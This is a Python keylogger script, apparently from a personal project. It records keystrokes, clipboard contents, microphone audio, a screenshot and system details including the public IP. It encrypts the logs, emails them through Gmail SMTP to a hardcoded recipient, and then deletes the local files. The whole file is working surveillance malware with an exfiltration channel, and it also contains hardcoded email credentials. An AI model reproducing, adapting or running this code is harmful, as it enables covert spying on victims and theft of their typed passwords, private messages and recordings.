import os
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from PIL import ImageGrab
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Paths and File Names
save_path = "C:/Users/archi/Desktop/Keylogger/"
log_file = "activity_log.txt"
sys_info_file = "system_info.txt"
clipboard_file = "clipboard_data.txt"
audio_file = "audio_recording.wav"
screenshot_file = "screenshot_img.png"
encrypted_log_file = "encrypted_activity_log.txt"
encrypted_sys_info_file = "encrypted_system_info.txt"
encrypted_clipboard_file = "encrypted_clipboard_data.txt"

# Email Configuration
email_address = "keylogger_project01@proton.me"
password = "qwertyui"
recipient_email = "nick84172@gmail.com"

# Read the encryption key from the file
with open(save_path + "encryption_key.txt", 'rb') as file:
    key = file.read()

fernet = Fernet(key)

# Function to Send Email
def send_email(subject, body, filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', f"attachment; filename= {filename}")
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    s.sendmail(fromaddr, toaddr, msg.as_string())
    s.quit()
    print(f"Email sent to {toaddr} with subject '{subject}'")

# Function to Get System Information
def get_system_info():
    with open(save_path + sys_info_file, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address\n")
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
    print("System information collected")

# Function to Get Clipboard Data
def get_clipboard_data():
    with open(save_path + clipboard_file, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data:\n" + data + "\n")
        except:
            f.write("Clipboard could not be copied\n")
    print("Clipboard data collected")

# Function to Record Microphone
def record_microphone():
    fs = 44100
    seconds = 10  # Duration of recording
    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(save_path + audio_file, fs, recording)
    print("Audio recorded")

# Function to Capture Screenshot
def capture_screenshot():
    img = ImageGrab.grab()
    img.save(save_path + screenshot_file)
    print("Screenshot captured")

# Function to Start Keylogger
def start_keylogger():
    keys = []
    count = 0

    def on_press(key):
        nonlocal keys, count
        keys.append(key)
        count += 1
        if count >= 10:
            count = 0
            write_keys(keys)
            keys = []

    def write_keys(keys):
        with open(save_path + log_file, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)
        print("Keystrokes logged")

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Function to Encrypt Files
def encrypt_files():
    files_to_encrypt = [sys_info_file, clipboard_file, log_file]
    encrypted_files = [encrypted_sys_info_file, encrypted_clipboard_file, encrypted_log_file]

    for i in range(len(files_to_encrypt)):
        with open(save_path + files_to_encrypt[i], 'rb') as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(save_path + encrypted_files[i], 'wb') as f:
            f.write(encrypted)
        send_email("Encrypted Log File", "Attached is the encrypted log file.", encrypted_files[i], save_path + encrypted_files[i], recipient_email)
    print("Files encrypted and emails sent")

# Main Function
def main():
    print("Script started")
    get_system_info()
    get_clipboard_data()
    record_microphone()
    capture_screenshot()

    iterations = 3
    for _ in range(iterations):
        start_keylogger()
        time.sleep(15)  # Delay between captures
        encrypt_files()
        time.sleep(60)  # Delay between iterations

    # Clean up
    files_to_delete = [sys_info_file, clipboard_file, log_file, screenshot_file, audio_file]
    for file in files_to_delete:
        os.remove(save_path + file)
    print("Script completed and files cleaned up")

if __name__ == "__main__":
    main()
